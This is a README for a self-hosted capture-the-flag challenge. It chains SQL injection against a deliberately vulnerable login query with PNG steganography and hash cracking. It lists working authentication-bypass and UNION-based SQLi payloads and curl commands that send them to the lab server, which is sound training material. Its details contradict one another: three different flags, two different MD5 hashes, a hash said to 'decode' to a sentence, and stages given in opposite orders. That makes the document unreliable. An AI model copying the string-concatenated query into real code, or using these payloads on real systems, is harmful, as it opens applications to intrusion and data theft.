# CTF Challenge - Level 8: SQL Injection + Steganography

A Level-8 CTF challenge combining SQL injection exploitation with steganography to recover a hidden flag.

## Challenge Overview

This is a **multi-stage challenge** with 5 phases:

**Phase 1: SQL Injection**
- Exploit a SQL injection vulnerability in the login endpoint
- Use specific payload patterns to bypass authentication
- **Any successful SQLi redirects to dashboard automatically**

**Phase 2: Dashboard Access**
- All successful SQLi attempts redirect to steganography dashboard
- Advanced UI with forensic analysis tools
- Steganography analysis interface

**Phase 3: Steganography**
- Download and analyze the stego image
- Extract hidden payload with multiple data types
- Use forensic tools (exiftool, strings, binwalk)

**Phase 4: Hash Cracking (Two-Stage)**
- **Stage 1**: Crack MD5 hash to get intermediate value
- **Stage 2**: Decode Base64 string to get final part
- Sequential decryption required

**Phase 5: Flag Submission**
- Assemble the complete flag: `flag{PART1_PART2}`
- Submit through the dashboard interface

## Setup Instructions

### Prerequisites
- Node.js (v14 or higher)
- npm

### Installation
```bash
# Install dependencies
npm install

# Setup database with seed data
npm run setup

# Start the server
npm start
```

The server will run on `http://localhost:3000` by default.

### Environment Variables
- `PORT`: Server port (default: 3000)
- `FLAG_REAL`: The real flag for validation (default: `flag{IN_FRONT_OF_FOUNTAIN}`)

## Challenge Details

### Database Schema
- **users**: Contains user accounts (admin, user1, test, guest)
- **secrets**: Contains the path to the stego image (`/assets/inspect.png`)

### Vulnerable Endpoint
- **POST /login**: Intentionally vulnerable to SQL injection
- Uses unsafe string concatenation: `SELECT id, username, role FROM users WHERE username = '${username}' AND password = '${password}'`

### Intended Exploit Path
1. Use specific SQL injection payloads to bypass authentication
2. Only certain payload patterns are accepted by the system
3. Use UNION query to extract data from the `secrets` table
4. Example payload: `username=foo' UNION SELECT 1, note, 'admin' FROM secrets --`
5. This reveals the path `/assets/inspect.png`

### Accepted SQL Injection Payloads
The system only accepts specific SQL injection patterns:
- Basic boolean-based: `' or '1'='1`, `" or "1"="1`, `' or 1=1`, etc.
- Comment-based: `admin' --`, `admin' #`, `admin'/*`
- Union-based: Must include `UNION` and reference `secrets` table
- Other patterns: `' or true--`, `') or ('1'='1`, etc.

**Note**: Generic SQL injection attempts will be rejected with random error messages.

### Two-Stage Challenge Flow

**Stage 1: Base64 Hash Discovery**
- **SQL Injection** → Reveals base64 hash: `VXJsL2luc3BlY3QucG5nCg==`
- **Decode Base64** → `Url/inspect.png`
- **Decoy Images**: 4 images with fake base64 hashes to confuse

**Stage 2: MD5 Hash Extraction**
- **Download** → `public/assets/inspect.png`
- **Extract MD5** → `a54b1221f9fbf04b13b45d04ffd5a6bd`
- **Decode MD5** → `Congratulations ! You found the real flag !`

### Steganography Details
- **Real Image**: `public/assets/inspect.png`
- **Decoy Images**: `system_backup.png`, `network_config.png`, `user_profile.png`, `security_log.png`
- **Method**: PNG tEXt chunk (embedded as text data)
- **Real Payload Format**:
  ```
  MD5_HASH: a54b1221f9fbf04b13b45d04ffd5a6bd
  DECODED_MESSAGE: Congratulations ! You found the real flag !
  SUCCESS: You found the real flag!
  ```

### Final Flag
- **Base64 Hash**: `VXJsL2luc3BlY3QucG5nCg==` (decodes to "Url/inspect.png")
- **MD5 Hash**: `a54b1221f9fbf04b13b45d04ffd5a6bd` (decodes to "Congratulations ! You found the real flag !")
- **Final Flag**: `Congratulations ! You found the real flag !`

## Hints

1. **H1 (Visible)**: "Some results show three columns."
2. **H2 (On request)**: "Try `exiftool inspect.png` or `binwalk -e inspect.png` to inspect the file."
3. **H3 (Last resort)**: "The MD5 hash decodes to a congratulatory message."

## Testing the Challenge

### 1. Test SQL Injection
```bash
# Test basic SQLi (redirects to dashboard)
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "'\'' or '\''1'\''='\''1"}'

# Test UNION query (redirects to dashboard with stego path)
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "foo'\'' UNION SELECT 1, note, '\''admin'\'' FROM secrets --", "password": "bar"}'
```

**Note**: Both successful SQLi attempts will redirect to `/dashboard.html` automatically.

### 2. Download Stego Image
```bash
curl -O http://localhost:3000/assets/inspect.png
```

### 3. Extract Stego Payload
```bash
# Using exiftool (if available)
exiftool inspect.png

# Using strings command
strings inspect.png | grep -E "(FINAL_FLAG|HASH)"

# Using binwalk
binwalk -e inspect.png
```

### 4. Crack MD5 Hash
```bash
# Using hashcat
hashcat -m 0 -a 3 8d01676ad52c43fe0cb695ed248b9ce7 ?u?u?u?u?u?u?u?u

# Using john
echo "8d01676ad52c43fe0cb695ed248b9ce7" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Online lookup (for testing)
# The hash 8d01676ad52c43fe0cb695ed248b9ce7 corresponds to "FOUNTAIN"
```

### 5. Submit Flag
```bash
curl -X POST http://localhost:3000/submit \
  -H "Content-Type: application/json" \
  -d '{"flag": "Congratulations ! You found the real flag !", "team": "test"}'
```

## Security Features

### Rate Limiting
- Login attempts: 50 per 15 minutes per IP
- Flag submissions: 10 per 5 minutes per IP

### Logging
- All requests logged with IP, User-Agent, timestamp
- Passwords redacted in logs
- Failed attempts tracked

### Decoys
- Decoy flag at `public/flag/goal.txt`: `decoy{YOU_FELL_FOR_IT}`
- Common SQLi payloads redirect to decoy

## File Structure

```
sqli S3 8/
├── server.js              # Main Express server
├── setup-db.js            # Database initialization
├── embed-stego.js         # Stego image creation script
├── package.json           # Dependencies
├── public/
│   ├── index.html         # Challenge frontend
│   ├── assets/
│   │   ├── inspect.png        # Real stego image with final flag
│   │   ├── system_backup.png  # Decoy stego image
│   │   ├── network_config.png # Decoy stego image
│   │   ├── user_profile.png   # Decoy stego image
│   │   └── security_log.png   # Decoy stego image
│   └── flag/
│       └── goal.txt       # Decoy flag
├── ctf.db                 # SQLite database (created after setup)
└── README.md              # This file
```

## Admin Testing Checklist

- [ ] `git grep -n "flag{"` returns only decoy file
- [ ] SQL injection returns `/assets/inspect.png`
- [ ] Stego image downloads successfully
- [ ] Payload extraction works with `exiftool` or `strings`
- [ ] MD5 hash cracks to "FOUNTAIN"
- [ ] Flag submission accepts `Congratulations ! You found the real flag !`
- [ ] Rate limiting works correctly
- [ ] Logging captures all attempts

## Notes

- This challenge intentionally includes SQL injection vulnerabilities for educational purposes
- Do not use this code in production environments
- The challenge is designed to be solvable by humans but resistant to automated tools
- All sensitive data is server-side only; no flags in client code

## Troubleshooting

### Database Issues
```bash
# Reset database
rm ctf.db
npm run setup
```

### Stego Image Issues
```bash
# Recreate stego image
node embed-stego.js
```

### Server Issues
```bash
# Check if port is in use
netstat -an | findstr :3000

# Kill process using port (Windows)
taskkill /f /im node.exe
```
